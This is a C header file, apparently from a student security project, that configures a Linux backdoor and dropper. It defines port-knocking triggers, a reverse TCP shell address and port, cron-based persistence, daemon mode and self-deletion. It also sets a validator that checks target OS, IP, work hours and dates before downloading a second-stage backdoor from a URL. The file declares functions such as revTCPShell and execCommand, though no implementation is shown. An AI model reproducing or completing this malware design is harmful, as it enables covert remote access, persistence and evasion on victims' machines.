/*  File: functionality.h
*   Author: STUDENT
*   Date: 
*   Description:
*       
*       
*       
*       
*       
*/
#ifndef FUNCTIONALITY_H
#define FUNCTIONALITY_H

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <pcap.h>

 
// ===== Backdoor =====
# define INTERFACE                      // interface to listen on
//# define SINGLE_KNOCK              // Used for listening on a single port. Specifies the port value.
# define MULTI_KNOCK                // Used for listening on multiple ports.  Specifies the port values, in order.
# define NUM_PORTS                         // how many ports will be knocked. Required only for MULTI_KNOCK. len(MULTI_KNOCK)
# define SLEEP 3                            // ifdef, the programs will sleep for x seconds after process execution. If not defined, sleeps Rand([1,15]) seconds.

// ===== General ======
# define DEBUG 1                            // used for debugging. Mostly console printing.
//# define NO_DAEMON 1                      // define when you DON'T want to run the backdoor as a daemon
# define REV_SHELL_IP "127.0.0.1"           // used to open a reverse tcp shell on the specified ip & port
# define REV_SHELL_PORT 8008                // remote port to connect to 
# define PERSIST 1                          // Use to prevent uninstalling of the executables after execution. The backdoor also establishes a cron job.
// ===== Validator =====
# define VALID_SYSNAME "Linux"              // target OS
# define VALID_IP "127.0.0.1"               // target IP 
# define VALID_TIME 1                       // time is only validated if this is defined
# define WORK_START 8                       // Used to only download backdoor during 'work hours'
# define WORK_END 19                        // Used to only download backdoor during 'work hours'
# define START_DATE             // If defined  ("MM/DD/YYYY") and date < START_DATE, validator will sleep until after the start_date
# define END_DATE               // If defined  ("MM/DD/YYYY") and date > END_DATE, validator will exit and uninstall
# define URL "http://0.0.0.0:9009/backdoor.out"   // URL at which to download the backdoor payload (2nd stage)


// ===== General Functions =====
// because of linking, these need to be defined in both of the individual helper source files.

// deletes the program from disk
void uninstallProg(char* prog);

// my implementation of perror(). Checks if DEBUG is defined and calls perror(msg). Returns EXIT_FAILURE (1) always.
int my_perror(char* msg);

// creates a reverse tcp shell that tries connecting to IP:Port
int revTCPShell();

// used when running the dropper as a Daemon is specified as an option. Returns EXIT_FAILURE on failure.
void daemonize();

// returns a random num between 1 & 15. Used for sleep()s
int getRandom();

/* executes the command using popen & forks if forkk==1
Returns result in buff if read!=0. Returns -1 if any errors. 
Need to free buf if reading from it after use.*/
int execCommand(char* command, char** buff, int read, int forkk);

#endif